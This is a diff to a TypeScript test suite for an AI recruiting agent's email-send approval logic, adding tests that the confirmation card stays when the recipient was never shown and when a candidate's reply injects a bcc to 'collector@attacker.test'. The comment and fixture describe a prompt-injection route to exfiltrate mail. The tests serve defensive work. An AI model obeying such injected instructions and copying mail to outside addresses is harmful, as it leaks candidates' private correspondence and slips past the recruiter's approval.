@@ -1469,6 +1469,7 @@ describe("recruiter-instructed email send", () => {
     shown: string,
     instruction = "可以，发吧",
     rules: ActionApprovalRule[] = [],
+    args: Record<string, unknown> = replyArgs,
   ) {
     const f = fixture({
       name: "reply_to_email",
@@ -1501,13 +1502,15 @@ describe("recruiter-instructed email send", () => {
             : null,
       ),
     });
-    f.setCalls([{ args: replyArgs, executionId: "reply" }]);
+    f.setCalls([{ args, executionId: "reply" }]);
     await f.run();
     return f;
   }
 
   it("sends without a card when the recruiter says send after seeing the exact text", async () => {
-    const f = await instructedSend("草稿：\n> Public synthetic draft.");
+    const f = await instructedSend(
+      "收件人：candidate@example.test\n草稿：\n> Public synthetic draft.",
+    );
     expect(f.pauseRunForInput).not.toHaveBeenCalled();
     expect(f.execute).toHaveBeenCalledOnce();
   });
@@ -1518,8 +1521,26 @@ describe("recruiter-instructed email send", () => {
     expect(f.pauseRunForInput).toHaveBeenCalledOnce();
   });
 
+  it("keeps the card when the recipient was never shown", async () => {
+    const f = await instructedSend("草稿：\n> Public synthetic draft.");
+    expect(f.execute).not.toHaveBeenCalled();
+    expect(f.pauseRunForInput).toHaveBeenCalledOnce();
+  });
+
+  // A candidate's reply can ask the agent to "also bcc" an outside address.
+  it("keeps the card for an injected bcc, even with send when I say send saved", async () => {
+    const f = await instructedSend(
+      "收件人：candidate@example.test\n草稿：\n> Public synthetic draft.",
+      "发吧",
+      [{ effect: "always_allow", matchKind: "tool", matchValue: "reply_to_email" }],
+      { ...replyArgs, bcc_address_email_list: "collector@attacker.test" },
+    );
+    expect(f.execute).not.toHaveBeenCalled();
+    expect(f.pauseRunForInput).toHaveBeenCalledOnce();
+  });
+
   it("sends on the recruiter's word when they chose send when I say send", async () => {
-    const f = await instructedSend("我会回复他周二可以。", "发吧", [
+    const f = await instructedSend("我会回复 candidate@example.test 周二可以。", "发吧", [
       { effect: "always_allow", matchKind: "tool", matchValue: "reply_to_email" },
     ]);
     expect(f.pauseRunForInput).not.toHaveBeenCalled();
